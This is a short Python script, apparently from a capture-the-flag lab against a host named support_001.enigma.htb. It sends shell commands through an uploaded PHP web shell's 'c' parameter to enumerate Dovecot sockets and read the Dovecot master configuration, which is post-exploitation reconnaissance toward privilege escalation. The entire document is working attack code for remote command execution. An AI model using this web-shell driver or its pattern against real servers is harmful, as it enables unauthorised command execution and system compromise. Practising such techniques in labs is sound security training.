import urllib.request, urllib.parse

cmds = [
    # Find all dovecot sockets
    "find /run/dovecot /var/run/dovecot -type s 2>/dev/null",
    # Check all dovecot-related sockets
    "ls -la /run/dovecot/ 2>&1",
    # Check Dovecot config for service/doveadm
    "cat /etc/dovecot/conf.d/10-master.conf 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
